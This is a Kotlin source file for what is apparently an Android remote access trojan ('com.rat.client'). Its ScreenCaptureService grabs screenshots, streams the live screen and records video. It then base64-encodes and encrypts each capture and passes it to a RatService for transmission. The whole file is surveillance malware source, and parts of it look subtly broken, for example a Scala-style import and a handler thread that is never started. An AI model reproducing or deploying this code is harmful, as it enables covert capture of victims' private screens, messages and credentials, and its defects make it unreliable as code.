package com.rat.client.service

import android.app.Activity
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.Surface
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import com.rat.client.RatApplication
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.service.RatService
import com.rat.client.util.{DeviceUtils, FileUtils, SystemUtils}
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors

class ScreenCaptureService : Service() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "ScreenCaptureService"
        private var mediaProjection: MediaProjection? = null
        private var mediaProjectionManager: MediaProjectionManager? = null
        private var virtualDisplay: VirtualDisplay? = null
        private var imageReader: ImageReader? = null
        private var mediaRecorder: MediaRecorder? = null
        private var isRecording = false
        private var isStreaming = false
        private val handlerThread = HandlerThread("ScreenCaptureThread")
        private val captureHandler = Handler(handlerThread.looper)
        private val executor = Executors.newSingleThreadExecutor()
        private var displayMetrics: DisplayMetrics? = null
        private var screenWidth = 0
        private var screenHeight = 0
        private var screenDensity = 1f

        
        fun requestScreenCapture(activity: Activity) {
            mediaProjectionManager = activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), 1004)
        }

        
        fun setMediaProjectionResult(resultCode: Int, data: Intent) {
            val context = RatApplication.getInstance() ?: return
            mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)

            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            displayMetrics = DisplayMetrics()
            windowManager.defaultDisplay.getRealMetrics(displayMetrics)
            screenWidth = displayMetrics.widthPixels
            screenHeight = displayMetrics.heightPixels
            screenDensity = displayMetrics.density

            Log.d(TAG, "Screen capture initialized: ${screenWidth}x${screenHeight}")
        }

        
        fun captureScreenshot(context: Context): Map<String, Any> {
            return try {
                if (mediaProjection == null) {
                    return mapOf("error" to "Media projection not initialized")
                }

                val file = createMediaFile(context, "SCR", "png")
                val imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)

                val virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "Screenshot",
                    screenWidth,
                    screenHeight,
                    screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.surface,
                    null,
                    null
                )

                // Wait for frame
                Thread.sleep(100)

                val image = imageReader.acquireLatestImage()
                val bitmap = imageToBitmap(image)
                image?.close()
                virtualDisplay?.release()

                val baos = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos)
                val bytes = baos.toByteArray()
                FileOutputStream(file).use { it.write(bytes) }
                bitmap.recycle()

                val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                sendScreenshotResult(base64, file)

                mapOf("success" to true, "path" to file.absolutePath, "base64" to base64)
            } catch (e: Exception) {
                Log.e(TAG, "Screenshot failed: ${e.message}")
                mapOf("error" to e.message ?: "Unknown error")
            }
        }

        
        fun toggleScreenStream(enable: Boolean): Map<String, Any> {
            isStreaming = enable
            if (enable) {
                startScreenStream()
            } else {
                stopScreenStream()
            }
            return mapOf("streaming" to enable)
        }

        private fun startScreenStream() {
            if (mediaProjection == null) return

            executor.execute {
                try {
                    imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 4)

                    virtualDisplay = mediaProjection?.createVirtualDisplay(
                        "ScreenStream",
                        screenWidth,
                        screenHeight,
                        screenDensity,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                        imageReader.surface,
                        null,
                        captureHandler
                    )

                    imageReader?.setOnImageAvailableListener({ reader ->
                        val image = reader.acquireLatestImage()
                        image?.let { img ->
                            val bitmap = imageToBitmap(img)
                            val baos = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos)
                            val bytes = baos.toByteArray()
                            val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                            sendFrameResult(base64)
                            bitmap.recycle()
                            img.close()
                        }
                    }, captureHandler)
                } catch (e: Exception) {
                    Log.e(TAG, "Screen stream error: ${e.message}")
                }
            }
        }

        private fun stopScreenStream() {
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null
            isStreaming = false
        }

        
        fun recordScreen(context: Context, durationMs: Long = 30000): Map<String, Any> {
            return try {
                if (mediaProjection == null) {
                    return mapOf("error" to "Media projection not initialized")
                }

                if (isRecording) {
                    return mapOf("error" to "Already recording")
                }

                val file = createMediaFile(context, "REC", "mp4")
                mediaRecorder = MediaRecorder().apply {
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setVideoEncodingBitRate(12000000)
                    setVideoFrameRate(30)
                    setVideoSize(screenWidth, screenHeight)
                    setOutputFile(file.absolutePath)
                }

                val surface = mediaRecorder.surface
                mediaRecorder.prepare()
                mediaRecorder.start()
                isRecording = true

                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "ScreenRecord",
                    screenWidth,
                    screenHeight,
                    screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    surface,
                    null,
                    null
                )

                // Stop after duration
                Handler(android.os.Looper.getMainLooper()).postDelayed({
                    stopScreenRecording()
                }, durationMs)

                mapOf("success" to true, "path" to file.absolutePath, "duration_ms" to durationMs)
            } catch (e: Exception) {
                Log.e(TAG, "Screen record failed: ${e.message}")
                mapOf("error" to e.message ?: "Unknown error")
            }
        }

        
        fun stopScreenRecording(): Map<String, Any> {
            return try {
                if (!isRecording) {
                    return mapOf("error" to "Not recording")
                }
                mediaRecorder?.stop()
                mediaRecorder?.reset()
                mediaRecorder?.release()
                mediaRecorder = null
                virtualDisplay?.release()
                virtualDisplay = null
                isRecording = false
                mapOf("success" to true)
            } catch (e: Exception) {
                Log.e(TAG, "Stop screen record failed: ${e.message}")
                mapOf("error" to e.message)
            }
        }

        private fun imageToBitmap(image: Image): Bitmap {
            val plane = image.planes[0]
            val buffer = plane.buffer
            val bitmap = Bitmap.createBitmap(image.width, image.height, Bitmap.Config.ARGB_8888)
            bitmap.copyPixelsFromBuffer(buffer)
            return bitmap
        }

        private fun createMediaFile(context: Context, prefix: String, extension: String): File {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val filename = "${prefix}_${timestamp}.${extension}"
            val mediaDir = context.getExternalFilesDir(android.os.Environment.DIRECTORY_PICTURES) ?: context.filesDir
            return File(mediaDir, filename)
        }

        private fun sendScreenshotResult(base64: String, file: File) {
            val service = RatService.getInstance()
            val data = mapOf(
                "type" to "screenshot",
                "base64" to base64,
                "path" to file.absolutePath,
                "size" to file.length(),
                "width" to screenWidth,
                "height" to screenHeight,
                "timestamp" to System.currentTimeMillis()
            )
            service?.sendCommand("media_result", EncryptionUtils.encrypt(Gson().toJson(data)))
        }

        private fun sendFrameResult(base64: String) {
            val service = RatService.getInstance()
            val data = mapOf(
                "type" to "frame",
                "subtype" to "screen",
                "base64" to base64,
                "width" to screenWidth,
                "height" to screenHeight,
                "timestamp" to System.currentTimeMillis()
            )
            service?.sendCommand("media_stream", EncryptionUtils.encrypt(Gson().toJson(data)))
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}